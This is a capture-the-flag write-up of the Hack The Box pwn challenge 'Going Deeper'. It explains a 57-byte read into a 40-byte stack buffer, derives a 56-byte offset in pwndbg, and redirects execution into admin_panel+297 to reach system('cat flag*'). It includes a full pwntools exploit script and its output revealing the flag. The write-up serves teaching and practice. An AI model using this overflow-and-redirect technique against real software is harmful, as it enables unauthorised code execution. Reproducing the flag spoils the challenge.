---
title: "Going Deeper 🧬 - Buffer Overflow + Jump Into Function"
tags: [HTB, pwn, logic bug, buffer overflow, ELF internals, redirect]
---

# Going Deeper 🧬

![Category](https://img.shields.io/badge/category-Pwn-orange)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue)
![Platform](https://img.shields.io/badge/platform-Linux-blue)
![HTB](https://img.shields.io/badge/HTb-Challenge-green)

> This challenge hides an admin panel, guarded by arguments. But who needs them when we can jump straight in?

## Table of Contents 📚
- [Binary Info](#binary-info-) 🧠
- [Vulnerability Summary](#vulnerability-summary-) 🧩
- [The Trick](#the-trick-) 🔍
- [Exploit Strategy](#exploit-strategy-) ✅
- [Final Exploit Script](#final-exploit-script-) 💣
- [Output](#output-) 🎯
- [Conclusion](#conclusion-) 📘

## Binary Info 🧠

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'./glibc/'
Stripped:   No
```

## Vulnerability Summary 🧩

The `admin_panel` function performs the flag logic — but only if it's called with these exact values:

```c
  read(0,local_38,0x39);
  if (((param_1 == 0xdeadbeef) && (param_2 == 0x1337c0de)) && (param_3 == 0x1337beef)) {
    iVar1 = strncmp("DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft",local_38,0x34);
    if (iVar1 != 0) {
      printf("\n%s[+] Welcome admin! The secret message is: ",&DAT_00400c38);
      system("cat flag*");
      goto LAB_00400b38;
    }
  }
```

So we have to put a special sequence of chars: `DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft` (51 chars)

But, param_1, param_2 and param_3 aren't correct. They are initialized with these values:

`admin_panel(1,2,3);`

However, there's an **overflow** due to:

```c
char local_38[40];
read(0, local_38, 0x39);  // 57 bytes into 40 buffer → Overflow spotted!
```

Let's dig with gdb:

```c
└──╼ $gdb ./sp_going_deeper
...
pwndbg> cyclic 1000
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaae
pwndbg> run
Starting program: 
...
>> 1

[*] Input: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaae
...
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400b69 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────
 ...
 RBP  0x6161616161616167 ('gaaaaaaa')
 RSP  0x7fffffffdc60 —▸ 0x400ba0 (__libc_csu_init) ◂— push r15
 RIP  0x400b69 (main+34) ◂— add dword ptr [rax], eax
 ...
pwndbg> cyclic -l gaaaaaaa
Finding cyclic pattern of 8 bytes: b'gaaaaaaa' (hex: 0x6761616161616161)
Found at offset 48
```

We can see the pattern reached **RBP** at offset 48.

### 💡 Deep Dive: Why the Real Offset is 56

The value `gaaaaaaa` was found in the `RBP` register, and `cyclic -l` tells us it occurs at offset 48.

However, our goal isn't to overwrite `RBP`, but rather the return address — which lies **just after** it on the stack.

Here’s how the stack layout typically looks in an x86_64 binary when entering a function:

```
[ local buffer (char[40]) ]   ← our overflow starts here
[ saved RBP (8 bytes)       ] ← overwritten at offset 48
[ return address (RIP)      ] ← this is what we want to control
```

So the full path to reach and overwrite `RIP` is:

- 40 bytes to fill the buffer (`local_38`)
- +8 bytes to overwrite the saved `RBP`
- = **48 + 8 = 56 bytes total**

👉 **Final offset = 56**

Even if `cyclic` shows offset 48 (because `RBP` gets hit first), we need to **go 8 bytes further** to land into `RIP`, which is the true control point.

> That’s why the payload is built as:
>
> ```python
> payload = b"A" * 56 + p64(target_addr)
> ```

### 🧠 What About RSP?

Good catch: we don’t "overwrite" `RSP` directly, because it’s a register pointing to the current stack frame — not a value we can reach with our input.

When we do a `ret` instruction, the CPU fetches the next instruction address **from the memory pointed to by `RSP`**.  
Our overflow simply changes the value **at that memory location** (i.e., we change what `RSP` *will read* at `ret`), not `RSP` itself.

→ So `RSP` stays intact, but it loads **our injected address** into `RIP` when the function returns.

This allows full control of the return address.

## The Trick 🔍

The function `admin_panel` contains a **fallthrough path** after login that prints the flag *if the `strncmp` fails* — this is exploitable.

> But calling `admin_panel()` normally requires setting RDI, RSI, and RDX (hard to do without gadgets).

Because remember the checksec: no PIE!

If we disassemble the admin_panel function:

```c
pwndbg> disass admin_panel
Dump of assembler code for function admin_panel:
   ...
   0x0000000000400b0d <+292>:	call   0x400710 <printf@plt>
   0x0000000000400b12 <+297>:	lea    rdi,[rip+0xaa5]        # 0x4015be
   0x0000000000400b19 <+304>:	call   0x400700 <system@plt>
   ...
```

We can see that at the admin_panel +292 we all this printf function:

`printf("\n%s[+] Welcome admin! The secret message is: ",&DAT_00400c38);`

And just after that, we see an instruction that prepare the parameter for the next instruction (system). 

In gdb:

```c
pwndbg> x/s 0x4015be
0x4015be:	"cat flag*"
```

🧠 **The trick used here**: That's why we know where we want to jump: `admin_panel+297`. 

That **skips** argument checks and jumps directly into the flag printing logic.

## Exploit Strategy ✅

1. Overwrite return address via overflow with `A*56 + p64(admin_panel+297)`
2. This jumps directly into the section that prints the flag after failed login check
3. Because it bypasses checks, the flag is printed regardless of params!

## Final Exploit Script 💣

```python
#!/usr/bin/env python3
from pwn import *
import argparse

context.binary = './sp_going_deeper'
elf = context.binary

def get_process(args):
    if args.host and args.port:
        return remote(args.host, int(args.port))
    return process(elf.path)

def build_payload():
    offset = 56
    target_addr = elf.symbols['admin_panel'] + 297
    return b"A" * offset + p64(target_addr)

def trigger_exploit(p, payload):
    p.sendlineafter(b'>> ', b'1')             # Trigger input
    p.sendlineafter(b'Input: ', payload)      # Send payload

def main():
    parser = argparse.ArgumentParser(description="Exploit script for sp_going_deeper")
    parser.add_argument('--host', help='Remote host')
    parser.add_argument('--port', help='Remote port')
    args = parser.parse_args()

    p = get_process(args)
    payload = build_payload()
    trigger_exploit(p, payload)

    try:
        flag = p.recvline_contains(b'HTB', timeout=1).strip().decode()
        success(f"[+] Flag: {flag}")
    except EOFError:
        error("[-] Exploit sent but no flag received.")
    p.close()

if __name__ == "__main__":
    main()
```

```bash
python3 sp_going_deeper_exploit.py
python3 sp_going_deeper_exploit.py --host 1.2.3.4 --port 1337
```

## Output 🎯

```
└──╼ $python3 exploit.py --host 94.237.53.203 --port 55349
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./glibc/'
    Stripped:   No
[+] Opening connection to 94.237.53.203 on port 55349: Done
[+] [+] Flag: HTB{d1g_1n51d3..u_Cry_cry_cry}
[*] Closed connection to 94.237.53.203 port 55349
```

## Conclusion 📘

This challenge showcases how:
- A buffer overflow can redirect control flow
- You don't always need full ROP — just a clever jump
- Reversing control flow within a function pays off

A clean "shortcut-to-win" challenge with elegant minimal exploitation.

🔙 [Back to Challenge Writeups](../../)